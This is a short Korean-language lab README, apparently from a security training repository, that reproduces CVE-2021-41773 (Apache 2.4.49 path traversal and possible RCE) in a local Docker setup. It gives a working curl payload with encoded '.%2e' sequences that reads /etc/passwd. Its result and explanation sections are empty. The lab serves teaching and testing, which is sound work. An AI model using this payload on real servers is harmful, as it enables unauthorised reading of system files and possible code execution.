# CVE-2021-41773 [Apache HTTP Server Path Traversal & RCE]

> 화이트햇 스쿨 3기 - [이준영 (@ljyoung04)](https://github.com/ljyoung04)

<br/>

## 요약

- Apache HTTP Server 2.4.49 버전의 경로 정규화 변경 사항에서 결함이 발견되었습니다.
- 이 결함을 사용하여 Path Traversal 공격을 수행하여 Alias와 유사한 지시문으로 구성된 디렉터리 외부의 파일에 접근할 수 있습니다.
- 또한 CGI 스크립트 실행이 활성화되어 있다면 RCE가 가능할 수도 있습니다.
- 실제로 악용된 사례가 있으며 오직 Apache 2.4.49 버전에만 해당됩니다.
- 이 취약점에 대한 수정이 이루어졌지만, 수정이 불완전하여 CVE-2021-42013으로 이어졌습니다.

<br/>

## 환경 구성 및 실행

다음 명령어를 입력하여 취약한 도커 환경을 구축할 수 있다.

```
$ sudo docker compose up -d
```

```
$curl localhost:8080
<meta charset="UTF-8" />
<h1>WHS 3기 이준영</h1>
<h2>CVE-2021-41773 TEST</h2>
$
```

아래와 같이 입력하여 Path Traversal 공격을 수행할 수 있다.

```
curl --path-as-is -v http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

<img src="https://github.com/ljyoung04/kr-vulhub/blob/main/Apache/CVE-2021-41773/image.png">
<br/>

## 결과

<br/>

## 설명
